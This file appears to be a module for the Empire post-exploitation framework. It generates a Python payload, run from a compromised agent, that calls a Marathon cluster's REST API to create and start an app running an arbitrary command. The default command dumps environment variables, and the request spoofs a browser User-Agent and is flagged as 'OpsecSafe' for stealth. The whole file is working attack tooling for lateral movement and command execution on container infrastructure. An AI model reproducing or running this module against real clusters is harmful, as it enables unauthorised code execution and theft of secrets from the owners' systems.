from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Marathon API Create and Start App',

            # list of one or more authors for the module
            'Author': ['@TweekFawkes'],

            # more verbose multi-line description of the module
            'Description': ('Create and Start a Marathon App using Marathon\'s REST API'),

            # True if the module needs to run in the background
            'Background' : True,

            # File extension to save the file as
            'OutputExtension': "",

            # if the module needs administrative privileges
            'NeedsAdmin' : False,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': ["Marathon REST API documentation version 2.0: https://mesosphere.github.io/marathon/docs/generated/api.html", "Marathon REST API: https://mesosphere.github.io/marathon/docs/rest-api.html", "Marathon REST API: https://open.mesosphere.com/advanced-course/marathon-rest-api/"]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Target' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'FQDN, domain name, or hostname to lookup on the remote target.',
                'Required'      :   True,
                'Value'         :   'marathon.mesos'
            },
            'Port' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The port to connect to.',
                'Required'      :   True,
                'Value'         :   '8080'
            },
            'ID' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The id of the marathon app.',
                'Required'      :   True,
                'Value'         :   'app001'
            },
            'Cmd' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The command to run.',
                'Required'      :   True,
                'Value'         :   'env && sleep 300'
            },
            'CPUs' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The number of CPUs to assign to the app.',
                'Required'      :   True,
                'Value'         :   '1'
            },
            'Mem' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The Memory (MiB) to assign to the app.',
                'Required'      :   True,
                'Value'         :   '128'
            },
            'Disk' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The Disk Space (MiB) to assign to the app.',
                'Required'      :   True,
                'Value'         :   '0'
            },
            'Instances' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'The number of instances to assign to the app.',
                'Required'      :   True,
                'Value'         :   '1'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
        target = self.options['Target']['Value']
        port = self.options['Port']['Value']
        appId = self.options['ID']['Value']
        cmd = self.options['Cmd']['Value']
        cpus = self.options['CPUs']['Value']
        mem = self.options['Mem']['Value']
        disk = self.options['Disk']['Value']
        instances = self.options['Instances']['Value']

        script = """
import urllib2

target = "%s"
port = "%s"
appId = "%s"
cmd = "%s"
cpus = "%s"
mem = "%s"
disk = "%s"
instances = "%s"

url = "http://" + target + ":" + port + "/v2/apps"

try:
    data = '{'

    data += '"id": "'
    data += appId
    data += '",'

    data += '"cmd": "'
    data += cmd
    data += '",'

    data += '"cpus": '
    data += cpus
    data += ','

    data += '"mem": '
    data += mem
    data += ','
    
    data += '"disk": '
    data += disk
    data += ','

    data += '"instances": '
    data += instances

    data += '}'

    print str(data)
    request = urllib2.Request(url, data)
    request.add_header('User-Agent',
                   'Mozilla/6.0 (X11; Linux x86_64; rv:24.0) '
                   'Gecko/20140205     Firefox/27.0 Iceweasel/25.3.0')
    request.add_header('Content-Type', 'application/json')
    opener = urllib2.build_opener(urllib2.HTTPHandler)
    content = opener.open(request).read()
    print str(content)
except Exception as e:
    print "Failure sending payload: " + str(e)

print "Finished"
""" %(target, port, appId, cmd, cpus, mem, disk, instances)

        return script
